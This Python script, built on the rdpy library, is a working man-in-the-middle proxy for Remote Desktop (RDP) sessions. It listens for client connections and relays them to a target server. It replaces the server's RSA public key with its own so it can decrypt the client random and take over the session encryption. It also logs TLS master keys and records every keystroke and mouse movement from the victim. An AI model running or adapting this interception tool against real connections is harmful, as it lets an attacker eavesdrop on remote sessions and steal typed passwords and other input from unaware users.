import logging
from Crypto.PublicKey import RSA

from twisted.internet import reactor
from twisted.internet.protocol import ServerFactory, ClientFactory

from rdpy.core import log
from rdpy.core.crypto import SecuritySettings
from rdpy.enum.rdp import NegotiationProtocols, RDPSecurityHeaderType, EncryptionMethod, RDPDataPDUSubtype, \
    InputEventType
from rdpy.layer.gcc import GCCClientConnectionLayer
from rdpy.layer.mcs import MCSLayer, MCSClientConnectionLayer
from rdpy.layer.rdp.connection import RDPClientConnectionLayer
from rdpy.layer.rdp.data import RDPDataLayer, RDPDataLayerObserver
from rdpy.layer.rdp.licensing import RDPLicensingLayer
from rdpy.layer.rdp.security import RDPSecurityLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer
from rdpy.layer.x224 import X224Layer
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp.client_info import RDPClientInfoParser
from rdpy.parser.rdp.connection import RDPClientConnectionParser, RDPServerConnectionParser
from rdpy.parser.rdp.negotiation import RDPNegotiationParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSConnectResponsePDU, MCSAttachUserConfirmPDU, MCSChannelJoinConfirmPDU
from rdpy.pdu.rdp.connection import ServerSecurityData, RDPServerDataPDU, \
    ProprietaryCertificate
from rdpy.pdu.rdp.negotiation import RDPNegotiationResponsePDU
from rdpy.pdu.rdp.security import RDPSecurityExchangePDU
from rdpy.protocol.mcs.channel import MCSChannelFactory, MCSServerChannel, MCSClientChannel
from rdpy.protocol.mcs.client import MCSClientRouter
from rdpy.protocol.mcs.server import MCSServerRouter
from rdpy.protocol.mcs.user import MCSUserObserver, MCSUser
from rdpy.protocol.rdp.x224 import ServerTLSContext


class MITMChannelObserver(RDPDataLayerObserver):
    def __init__(self, layer, name = ""):
        RDPDataLayerObserver.__init__(self)
        self.layer = layer
        self.name = name
        self.peer = None
        self.setUnparsedDataHandler(self.onDataReceived)

    def setPeer(self, peer):
        self.peer = peer

    def onPDUReceived(self, pdu):
        if hasattr(pdu.header, "subtype"):
            log.debug("%s: received %s" % (self.name, pdu.header.subtype))
            if pdu.header.subtype == RDPDataPDUSubtype.PDUTYPE2_SYNCHRONIZE:
                self.sync = pdu

            if hasattr(pdu, "errorInfo"):
                log.debug("%s" % pdu.errorInfo)
        else:
            log.debug("%s: received %s" % (self.name, pdu.header.type))

        RDPDataLayerObserver.onPDUReceived(self, pdu)
        self.peer.sendPDU(pdu)

    def onDataReceived(self, data):
        log.debug("%s: received data" % self.name)
        self.peer.sendData(data)

    def sendPDU(self, pdu):
        if hasattr(pdu.header, "subtype"):
            log.debug("%s: sending %s" % (self.name, pdu.header.subtype))

            if hasattr(pdu, "errorInfo"):
                log.debug("%s" % pdu.errorInfo)
        else:
            log.debug("%s: sending %s" % (self.name, pdu.header.type))

        self.layer.sendPDU(pdu)

    def sendData(self, data):
        log.debug("%s: sending data, %s" % (self.name, data.encode('hex')))
        self.layer.sendData(data)





class MITMClient(MCSChannelFactory):
    def __init__(self, server):
        MCSChannelFactory.__init__(self)
        self.server = server

        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()
        self.router = MCSClientRouter(self.mcs, self)
        self.channelMap = {}
        self.channelDefinitions = []
        self.channelObservers = {}
        self.user = None
        self.security = SecuritySettings(SecuritySettings.Mode.CLIENT)
        self.conferenceCreateResponse = None
        self.serverData = None

        self.mcsConnect = MCSClientConnectionLayer(self.mcs)
        self.gccConnect = GCCClientConnectionLayer("1")
        self.rdpConnect = RDPClientConnectionLayer()

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.mcsConnect.setNext(self.gccConnect)
        self.gccConnect.setNext(self.rdpConnect)

        self.mcs.setObserver(self.router)

        self.tcp.createObserver(onConnection=self.startConnection)
        self.x224.createObserver(onConnectionConfirm=self.onConnectionConfirm)
        self.router.createObserver(onConnectResponse=self.onConnectResponse, onDisconnectProviderUltimatum=self.onDisconnectProviderUltimatum)
        self.gccConnect.createObserver(onPDUReceived=self.onConferenceCreateResponse)
        self.rdpConnect.createObserver(onPDUReceived=self.onServerData)

    def getProtocol(self):
        return self.tcp

    def log_debug(self, string):
        log.debug("Client: %s" % string)

    def log_error(self, string):
        log.error("Client: %s" % string)

    def startConnection(self):
        """
        Start the connection sequence to the target machine.
        """
        self.log_debug("TCP connected")
        negotiation = self.server.getNegotiationPDU()
        parser = RDPNegotiationParser()
        self.x224.sendConnectionRequest(parser.write(negotiation))

    def onConnectionConfirm(self, pdu):
        """
        Called when the X224 layer is connected.
        """
        self.log_debug("Connection Confirm received")
        self.server.onConnectionConfirm(pdu)

    def onConnectInitial(self, gccConferenceCreateRequest, clientData):
        """
        Called when a Connect Initial PDU is received.
        :param gccConferenceCreateRequest: the conference create request.
        :param clientData: the RDPClientDataPDU.
        """
        if clientData.networkData:
            self.channelDefinitions = clientData.networkData.channelDefinitions

        self.gccConnect.conferenceName = gccConferenceCreateRequest.conferenceName
        self.rdpConnect.send(clientData)

    def onConnectResponse(self, pdu):
        """
        Called when an MCS Connect Response PDU is received.
        """
        if pdu.result != 0:
            log.error("Connection Failed")
            self.server.onConnectResponse(self, pdu, None)
        else:
            self.log_debug("Connection Successful")
            self.mcsConnect.recv(pdu)
            self.server.onConnectResponse(pdu, self.serverData)

    def onConferenceCreateResponse(self, pdu):
        self.conferenceCreateResponse = pdu

    def onServerData(self, serverData):
        """
        Called when the server data from the GCC Conference Create Response is received.
        """
        self.serverData = serverData
        self.security.serverSecurityReceived(serverData.security)
        self.security.generateClientRandom()

        self.channelMap[self.serverData.network.mcsChannelID] = "I/O"

        for index in range(len(serverData.network.channels)):
            channelID = serverData.network.channels[index]
            self.channelMap[channelID] = self.channelDefinitions[index].name

    def onAttachUserRequest(self):
        self.user = self.router.createUser()
        self.user.setObserver(self)
        self.user.attach()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.server.onAttachConfirmed(user)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user):
        self.server.onAttachRefused(user)

    def onChannelJoinRequest(self, pdu):
        self.mcs.send(pdu)

    def buildChannel(self, mcs, userID, channelID):
        self.log_debug("building channel {} for user {}".format(channelID, userID))

        if self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_NONE:
            headerType = RDPSecurityHeaderType.NONE
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_FIPS:
            headerType = RDPSecurityHeaderType.FIPS
        else:
            headerType = RDPSecurityHeaderType.SIGNED

        if channelID != userID and self.channelMap[channelID] == "I/O":
            self.io = RDPDataLayer()
            security = RDPSecurityLayer(headerType, self.security.getCrypter())
            channel = MCSClientChannel(mcs, userID, channelID)

            channel.setNext(security)
            security.setNext(self.io)

            observer = MITMChannelObserver(self.io, "Client")
            self.channelObservers[channelID] = observer

            self.io.setObserver(observer)
            security.licensing.createObserver(onPDUReceived=self.onLicensingPDU)

            self.io.previous.sendSecurityExchange(self.security.encryptClientRandom())
        else:
            channel = None

        self.server.onChannelJoinConfirm(userID, channelID)
        return channel

    def onClientInfoReceived(self, pdu):
        self.io.previous.sendClientInfo(pdu)

    def onLicensingPDU(self, pdu):
        self.log_debug("Licensing PDU received")
        self.server.onLicensingPDU(pdu)

    def onDisconnectProviderUltimatum(self, pdu):
        self.log_debug("Disconnect Provider Ultimatum received")
        self.server.sendDisconnectProviderUltimatum(pdu)

    def getChannelObserver(self, channelID):
        return self.channelObservers[channelID]



class MITMServerRouter(MCSServerRouter):
    def __init__(self, server, mcs, factory):
        MCSServerRouter.__init__(self, mcs, factory, None)
        self.server = server

    def onAttachUserRequest(self, pdu):
        self.server.onAttachUserRequest(pdu)

    def attachSuccessful(self, userID):
        user = MCSUser(self, self.factory)
        user.onAttachConfirmed(userID)
        self.users[userID] = user
        self.mcs.send(MCSAttachUserConfirmPDU(0, userID))

    def attachFailed(self):
        self.mcs.send(MCSAttachUserConfirmPDU(1, 0))

    def onChannelJoinRequest(self, pdu):
        self.server.onChannelJoinRequest(pdu)

    def channelJoinAccepted(self, userID, channelID):
        self.users[userID].channelJoined(self.mcs, channelID)
        self.mcs.send(MCSChannelJoinConfirmPDU(0, userID, channelID, channelID, ""))





class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName):
        MCSUserObserver.__init__(self)
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.client = None
        self.negotiationPDU = None
        self.serverData = None
        self.licensing = None
        self.io = None
        self.securityLayer = None
        self.rc4RSAKey = RSA.generate(2048)
        self.settings = SecuritySettings(SecuritySettings.Mode.SERVER)

        self.use_tls = False
        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.tcp.createObserver(onConnection=self.onConnection)
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest)

        self.router = MITMServerRouter(self, self.mcs, self)
        self.router.createObserver(onConnectionReceived = self.onConnectInitial)
        self.mcs.setObserver(self.router)

        self.ioSecurityLayer = None
        self.licensingLayer = RDPLicensingLayer()
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.gcc = GCCParser()
        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()
        self.rdpNegotiationParser = RDPNegotiationParser()

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.negotiationPDU

    # Build protocol for the client side of the connection
    def buildProtocol(self, addr):
        self.client = MITMClient(self)
        return self.client.getProtocol()

    def logSSLParameters(self):
        log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                  self.tpkt.previous.transport.protocol._tlsConnection.master_key())

    def log_debug(self, string):
        log.debug("Server: %s" % string)

    def log_error(self, string):
        log.error("Server: %s" % string)

    # Connect the client side to the target machine
    def connectClient(self):
        reactor.connectTCP(self.targetHost, self.targetPort, self)

    # Connection sequence #0
    def onConnection(self):
        self.log_debug("TCP connected")

    # X224 Request
    def onConnectionRequest(self, pdu):
        self.log_debug("Connection Request received")
        self.negotiationPDU = self.rdpNegotiationParser.parse(pdu.payload)
        self.connectClient()

    # X224 Response
    def onConnectionConfirm(self, pdu):
        protocols = NegotiationProtocols.SSL if self.negotiationPDU.tlsSupported else NegotiationProtocols.NONE
        payload = self.rdpNegotiationParser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.negotiationPDU.tlsSupported:
            self.tpkt.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.use_tls = True

    # MCS Connect Initial
    def onConnectInitial(self, pdu):
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.log_debug("Connect Initial received")

        if self.use_tls:
            self.logSSLParameters()

        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    # MCS Connect Response
    def onConnectResponse(self, pdu, serverData):
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        cert = ProprietaryCertificate(
            cert.signatureAlgorithmID,
            cert.keyAlgorithmID,
            cert.publicKeyType,
            self.rc4RSAKey,
            cert.signatureType,
            cert.signature,
            cert.padding
        )

        security = ServerSecurityData(
            serverData.security.encryptionMethod,
            serverData.security.encryptionLevel,
            serverData.security.serverRandom,
            cert
        )
        self.settings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    # MCS Attach User Request
    def onAttachUserRequest(self, pdu):
        self.client.onAttachUserRequest()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.router.attachSuccessful(user.userID)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user):
        self.router.attachFailed()

    # MCS Channel Join Request
    def onChannelJoinRequest(self, pdu):
        self.client.onChannelJoinRequest(pdu)

    # MCS Channel Join Confirm
    def onChannelJoinConfirm(self, userID, channelID):
        self.router.channelJoinAccepted(userID, channelID)


    def buildChannel(self, mcs, userID, channelID):
        self.log_debug("building channel {} for user {}".format(channelID, userID))

        if self.use_tls:
            headerType = RDPSecurityHeaderType.BASIC
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_NONE:
            headerType = RDPSecurityHeaderType.NONE
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_FIPS:
            headerType = RDPSecurityHeaderType.FIPS
        else:
            headerType = RDPSecurityHeaderType.SIGNED

        if channelID == self.serverData.network.mcsChannelID:
            self.io = RDPDataLayer()
            self.securityLayer = RDPSecurityLayer(headerType, None)
            self.licensing = self.securityLayer.licensing
            channel = MCSServerChannel(mcs, userID, channelID)

            channel.setNext(self.securityLayer)
            self.securityLayer.setNext(self.io)

            self.securityLayer.createObserver(
                onClientInfoReceived = self.onClientInfoReceived,
                onSecurityExchangeReceived = self.onSecurityExchangeReceived
            )

            observer = MITMChannelObserver(self.io, "Server")
            clientObserver = self.client.getChannelObserver(channelID)

            observer.setPeer(clientObserver)
            clientObserver.setPeer(observer)

            self.io.setObserver(observer)
            observer.setDataHandler(RDPDataPDUSubtype.PDUTYPE2_INPUT, self.onInputPDUReceived)

            return channel

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.log_debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.settings.setClientRandom(clientRandom)
        self.securityLayer.crypter = self.settings.getCrypter()

    # Client Info Packet
    def onClientInfoReceived(self, pdu):
        self.log_debug("Client Info received")
        self.client.onClientInfoReceived(pdu)

    def onLicensingPDU(self, pdu):
        self.licensing.sendPDU(pdu)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.log_debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.log_debug("Mouse position: x = %d, y = %d" % (event.x, event.y))





class RDPServerFactory(ServerFactory):
    def __init__(self, targetIP, privateKeyFileName, certificateFileName):
        self._privateKeyFileName = privateKeyFileName
        self._certificateFileName = certificateFileName

    def buildProtocol(self, addr):
        server = MITMServer("127.0.0.2", 3390, self._certificateFileName, self._privateKeyFileName)
        return server.getProtocol()





log.get_logger().setLevel(logging.DEBUG)
reactor.listenTCP(3388, RDPServerFactory("127.0.0.1", None, None))
reactor.run()